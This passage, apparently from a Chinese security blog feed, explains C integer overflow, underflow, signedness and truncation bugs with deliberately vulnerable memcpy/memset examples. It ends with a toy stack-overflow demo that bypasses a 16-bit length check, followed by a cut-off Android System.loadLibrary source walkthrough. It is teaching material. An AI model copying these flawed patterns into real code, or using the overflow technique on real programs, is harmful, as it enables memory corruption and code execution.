    <content type="html"><![CDATA[<ul><li>无符号整数</li><li>有符号整数</li><li>截断</li><li>配合不安全函数进行栈溢出</li></ul><a id="more"></a>    <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> InputTest;                    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> OutputTest;        </span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"InputTest:"</span>);    </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;InputTest);    </span><br><span class="line">OutputTest = InputTest;    </span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OutputTest:%d\n"</span>, OutputTest);    </span><br><span class="line">        </span><br><span class="line">getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上表中，会把输入的InputTest传给无符号短整型OutputTest。无符号的16位整数（2个字节）可以表示0~2^16 -1，也就是0xFFFF</p><p><strong>运行结果：</strong></p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/application.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/application.png?raw=true"></p><p>从上面可以发现，如果输入的值为0~65535，显示是没有问题的。如果超过了65535（比如65536），那么返回的结果是0，65537结果是1。</p><p><strong>老规矩，拖入ida pro动态分析</strong></p><p>给scanf下断点，可以看到，值最终存放在ecx寄存器中。</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65535.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65535.png?raw=true"></p><p>如果我们输入65535，也就是0xFFFF.</p><p>如果输入65536，结果是0x10000</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65536.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65536.png?raw=true"></p><p>接下来的步骤是：OutputTest = InputTest，对应的汇编为：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">0FFFFh</span></span><br></pre></td></tr></table></figure><p>也就是将0018FF44这个地址的数值赋给eax，并做与操作.这样就完全剔除了高16位，只保留低16位的数值。</p><p>这也是为什么输入65536后数值会从0重新开始增加。</p><h2 id="无符号整数的上溢和下溢"><a href="#无符号整数的上溢和下溢" class="headerlink" title="无符号整数的上溢和下溢"></a>无符号整数的上溢和下溢</h2><p>负数 = 负数的补码 = 负数的反码 + 1</p><p>E.G: -1 可以表示为 100000001，取反 111111110，再加1，也就是111111111</p><p>对于无符号的整数，-1 = 0xFFFFFFFF</p><p><strong>常见的问题：</strong></p><blockquote><p>void <em>memcpy(void </em>dest, const void *src, size_t n)：从源src所指的内存地址的起始位置开始拷贝n个字节到目标dest所指的内存地址的起始位置中</p><p>void <em>memset(void </em>s, int ch, <a href="https://baike.baidu.com/item/size_t" target="_blank" rel="noopener">size_t</a> n)：将s中当前位置后面的n个字节 （typedef unsigned int size_t ）用 ch 替换并返回 s 。</p></blockquote><p><strong>下溢：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(<span class="keyword">size_t</span> cbSize)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>( cbSize &gt; <span class="number">1024</span> )    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">char</span> *pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[cbSize<span class="number">-1</span>];    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memset</span>(pBuf, <span class="number">0x90</span>, cbSize<span class="number">-1</span>);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cbsize = 0，那么memset的第三个参数就为-1，而第三个参数为无符号整数，因此数据为0xFFFFFFFF，空间超过可执行的范围，因此崩溃。</p><p><strong>上溢：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *s1, <span class="keyword">size_t</span> len1, <span class="keyword">char</span> *s2, <span class="keyword">size_t</span> len2)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>(len1 + len2 + <span class="number">1</span> &gt; <span class="number">1024</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">char</span> pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[len1 + len2 + <span class="number">1</span>];    </span><br><span class="line">    <span class="keyword">if</span>(pBuf == <span class="literal">NULL</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="built_in">memcpy</span>(pBuf, s1, len1);    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memcpy</span>(pBuf + len1, s2, len2);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>len1和len2都是无符号整数，如果len1=8，len2=0xFFFFFFFF，那么对于len1+len2+1这个运算来说，len2+1会变成0，然后再加上8，那么它的结果就是8。也就是说，new可能只分配了8个字节的空间，但是却要将长为0xFFFFFFFF的字符串复制到这个空间，那么结果就会造成程序的崩溃。</p><h2 id="有符号整数"><a href="#有符号整数" class="headerlink" title="有符号整数"></a>有符号整数</h2><ul><li>有符号整数之间的比较。</li><li>有符号整数的运算。</li><li>无符号整数和有符号整数的对比。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_something</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">char</span> szBuf[<span class="number">800</span>];    </span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="keyword">sizeof</span>(szBuf))    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(szBuf, buf, len);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的问题同样出在memcpy函数的第三个参数。由于memcpy使用的是无符号整数作为第三个参数的，但是最初的len是有符号整数。假设我们赋予len一个负值，那么就一定能够通过if语句的检测，但是当这个负值被运用在memcpy函数中时，len就可能变成一个非常大的正数，导致缓冲区及其后面的内容被改写，使得程序崩溃。</p><h2 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h2><p>截断问题主要发生在高位数的整数（如32位）复制到低位数的整数（如16位）的时候，发生的溢出现象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(byte *name, DWORD cbBuf)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> cbCalculatedBufSize = cbBuf;    </span><br><span class="line">    byte *buf = <span class="keyword">new</span> byte(cbCalculatedBufSize);    </span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, name, cbBuf);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 对于fun函数来说，如果它的第二个参数cbBuf的值为0x00010020，由于cbCalculatedBufSize只能接收16位的内容，那么在赋值后，该变量的值为0x0020，因此new仅仅分配了0x20这么多的字节，但是name的大小实际为0x00010020，这就造成了缓冲区溢出情况的出现。</p><h2 id="使用整数溢出实现栈溢出"><a href="#使用整数溢出实现栈溢出" class="headerlink" title="使用整数溢出实现栈溢出"></a>使用整数溢出实现栈溢出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span> </span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">char</span> overflow[] =    </span><br><span class="line">    <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>    </span><br><span class="line">    <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>    </span><br><span class="line">    <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68"</span>;    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// i是一个32位整数，s为16位。</span></span><br><span class="line">  <span class="comment">// 如果i = 65536,那么s = 0  </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> s;    </span><br><span class="line">    <span class="keyword">char</span> szBuf[<span class="number">8</span>];    </span><br><span class="line">    s = i;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断s是否大于8，我们原本输入的是65536，不合法，但截取低16位后为0，成功绕过</span></span><br><span class="line">    <span class="keyword">if</span>(s &gt; <span class="number">8</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(i &gt; <span class="keyword">sizeof</span>(overflow))    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="built_in">memcpy</span>(szBuf, overflow, <span class="keyword">sizeof</span>(overflow));    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span>    </span><br><span class="line">    &#123;    </span><br><span class="line">      <span class="comment">// memcpy是个不安全函数</span></span><br><span class="line">        <span class="comment">// 只有8字节的空间塞进去了65536个字节，栈溢出</span></span><br><span class="line">      <span class="comment">// overflow设置为我们编写好的shellcode即可</span></span><br><span class="line">        <span class="built_in">memcpy</span>(szBuf, overflow, i);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i, ret;       </span><br><span class="line">    i = <span class="number">65536</span>;    </span><br><span class="line">    ret = fun(i);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/ioio_jy/article/details/50576353" target="_blank" rel="noopener">https://blog.csdn.net/ioio_jy/article/details/50576353</a></p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;无符号整数&lt;/li&gt;
&lt;li&gt;有符号整数&lt;/li&gt;
&lt;li&gt;截断&lt;/li&gt;
&lt;li&gt;配合不安全函数进行栈溢出&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>System.loadLibrary() 做的事情</title>
    <link href="http://imlzq.com/2018/03/18/Jni_load/"/>
    <id>http://imlzq.com/2018/03/18/Jni_load/</id>
    <published>2018-03-18T05:05:36.000Z</published>
    <updated>2018-04-08T07:27:01.997Z</updated>
    
    <content type="html"><![CDATA[<p>本文源码摘自 android-6.0.0_r24分支</p><p>主要内容为梳理Android调用 System.loadLibrary()加载so库时的调用链</p> <a id="more"></a>   <h1 id="总括"><a href="#总括" class="headerlink" title="总括"></a>总括</h1><p>在能找到ClassLoader的情况下调用的顺序为：</p><ul><li>System.loadLibrary</li><li>Runtime.getRuntime().loadLibrary</li><li>构建本地文件系统和应用的库路径（在安装时，PMS会读取libs目录下的so文件，进行本地释放解压到指定目录）。拼接so的全称，匹配搜索so的全路径并返回</li><li>Runtime.getRuntime().doLoad()：获取从当前加载的Classloader获取LD_LIBRARY_PATH路径，传入底层的nativeLoad</li><li>获取虚拟机对象并调用其内部的LoadNativeLibrary方法。</li><li>判断目标库是否已加载。如果已加载，判断加载的ClassLoader和本次的ClassLoader是否相同，如果不同，则警告。如果未加载，使用dlopen打开并加载目标库的本进程的虚拟地址空间中，返回handle句柄。如果打开失败（handle为null），使用nativeBridge做二次尝试加载（会有是否支持nativeBridge加载的判断）。</li><li>如果两次加载都失败，直接返回。</li><li>如果加载成功，开始创建一个共享库对象。因为是多线程，所以在创建完成后需要判断是否有其他线程先于我们加载完成。如果是，则释放本次的资源。否，则使用dlsym获取JNI_OnLoad的地址。</li><li>如果目标库不存在JNI_OnLoad，返回false</li><li>如果存在，则调用并执行JNI_OnLoad-&gt;RegisterNatives-&gt;dvmRegisterJNIMethod-&gt;dvmUseJNIBridge.也就是说上层调用RegisterNatives，传入一个gMethods方法数组，注册的具体实现由各个VM自己实现。在Dalvik中，会遍历gMethod，将每个方法都存储到DalvikBridge中，也就完成了这个方法的注册。这里的Bridge其实是处理多平台的情况。比如so是面向多个平台的，每个平台都针对so有一套解析，比如参数的处理、栈架构的虚拟机、寄存器架构的虚拟机等，所以每个平台都自行封装一个Bridge，实现必要的方法，从而与上下层链接起来。</li></ul><h1 id="System-loadLibrary-load"><a href="#System-loadLibrary-load" class="headerlink" title="System.loadLibrary\load"></a>System.loadLibrary\load</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * See &#123;<span class="doctag">@link</span> Runtime#load&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load</span><span class="params">(String pathName)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().load(pathName, VMStack.getCallingClassLoader());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * See &#123;<span class="doctag">@link</span> Runtime#loadLibrary&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libName)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析loadLibrary.</p><p>这里会跟着调用Runtime的loadLibrary方法，传入两个值，一个是当前的so名称，一个是调用的ClassLoader。</p><ul><li>这里的so名称是不含”lib”前缀和”.so”后缀的。例如，要加载libtest.so，那么这里的libName应该为test</li><li>VMStack.getCallingClassLoader()这里其实就是获取可以加载该so的ClassLoader，说白了这里就是双亲委派模式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">VMStack</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the defining class loader of the caller's caller.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the requested class loader, or &#123;<span class="doctag">@code</span> null&#125; if this is the</span></span><br><span class="line"><span class="comment">     *         bootstrap class loader.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getCallingClassLoader</span><span class="params">()</span></span>;</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RunTime"><a href="#RunTime" class="headerlink" title="RunTime"></a>RunTime</h2><p>这里先提一下RunTime这个类。它的作用是将Java应用与它们正在运行的环境连接起来。这是个单例类，也就是说在Android中同一时间只能存在一个Runtime，每个应用获得的都是它的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allows Java applications to interface with the environment in which they are</span></span><br><span class="line"><span class="comment"> * running. Applications can not create an instance of this class, but they can</span></span><br><span class="line"><span class="comment"> * get a singleton instance by invoking &#123;<span class="doctag">@link</span> #getRuntime()&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> System</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Runtime</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>下图为它内部的函数结构</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Jni_load/RunTime_functions.png?raw=true" alt="RunTime_Detail"></p><p>它包含的功能其实也就是执行command、库相关的管理、系统资源信息的获取（如堆中可用内存、总共内存、堆最大可拓展到多少内存）等等。说白了就是一个桥接的作用，里面封了一堆方法用于上层快速调用或者获取系统调用、资源情况等。</p><h2 id="RunTime-getRuntime-loadLibrary"><a href="#RunTime-getRuntime-loadLibrary" class="headerlink" title="RunTime.getRuntime().loadLibrary"></a>RunTime.getRuntime().loadLibrary</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Searches for and loads the given shared library using the given ClassLoader.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libraryName, ClassLoader loader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (loader != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回的filename是目标库的全路径。</span></span><br><span class="line">            <span class="comment">// 此时的名字已经做好拼接.如/com/example/test/libtest.so</span></span><br><span class="line">            String filename = loader.findLibrary(libraryName);</span><br><span class="line">            <span class="keyword">if</span> (filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// It's not necessarily true that the ClassLoader used</span></span><br><span class="line">                <span class="comment">// System.mapLibraryName, but the default setup does, and it's</span></span><br><span class="line">                <span class="comment">// misleading to say we didn't find "libMyLibrary.so" when we</span></span><br><span class="line">                <span class="comment">// actually searched for "liblibMyLibrary.so.so".</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(loader + <span class="string">" couldn't find \""</span> +</span><br><span class="line">                                               System.mapLibraryName(libraryName) + <span class="string">"\""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String error = doLoad(filename, loader);</span><br><span class="line">            <span class="keyword">if</span> (error != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(error);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filename = System.mapLibraryName(libraryName);</span><br><span class="line">        List&lt;String&gt; candidates = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        String lastError = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (String directory : mLibPaths) &#123;</span><br><span class="line">            String candidate = directory + filename;</span><br><span class="line">            candidates.add(candidate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (IoUtils.canOpenReadOnly(candidate)) &#123;</span><br><span class="line">                String error = doLoad(candidate, loader);</span><br><span class="line">                <span class="keyword">if</span> (error == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>; <span class="comment">// We successfully loaded the library. Job done.</span></span><br><span class="line">                &#125;</span><br><span class="line">                lastError = error;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lastError != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(lastError);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(<span class="string">"Library "</span> + libraryName + <span class="string">" not found; tried "</span> + candidates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着看loadLibrary。</p><p>这里有个分叉，也就是传入的ClassLoader是否为空。</p><p>双亲委派模式也就是一层一层的往父类找，让父类先尝试加载，避免出现多个本质相同但加载器不同的字节码。</p><p><strong>先看loader != null的情况：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String filename = loader.findLibrary(libraryName);</span><br></pre></td></tr></table></figure><p>首先，去获取so的文件名，也就是对so名做拼装。上面提到的libtest.so，传入test，返回就是完整的名字。</p><p>之所以会有这么一步，是因为在不同平台下，test的拼装结果不一样，所以最好的方式就是上层应用方只需传入名称，前缀跟后缀由各个平台自动补齐。</p><p>在Android中，Classloader分两种:</p><ul><li>一种是DexClassloader，用于在app的路径下加载jar包或者apk中相关的资源。</li><li>一种是PathClassloader，用于加载本地文件系统路径下的资源</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A class loader that loads classes from &#123;<span class="doctag">@code</span> .jar&#125; and &#123;<span class="doctag">@code</span> .apk&#125; files</span></span><br><span class="line"><span class="comment"> * containing a &#123;<span class="doctag">@code</span> classes.dex&#125; entry. This can be used to execute code not</span></span><br><span class="line"><span class="comment"> * installed as part of an application.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class loader requires an application-private, writable directory to</span></span><br><span class="line"><span class="comment"> * cache optimized classes. Use &#123;<span class="doctag">@code</span> Context.getCodeCacheDir()&#125; to create</span></span><br><span class="line"><span class="comment"> * such a directory: &lt;pre&gt;   &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment"> *   File dexOutputDir = context.getCodeCacheDir();</span></span><br><span class="line"><span class="comment"> * &#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;strong&gt;Do not cache optimized classes on external storage.&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> * External storage does not provide access controls necessary to protect your</span></span><br><span class="line"><span class="comment"> * application from code injection attacks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DexClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 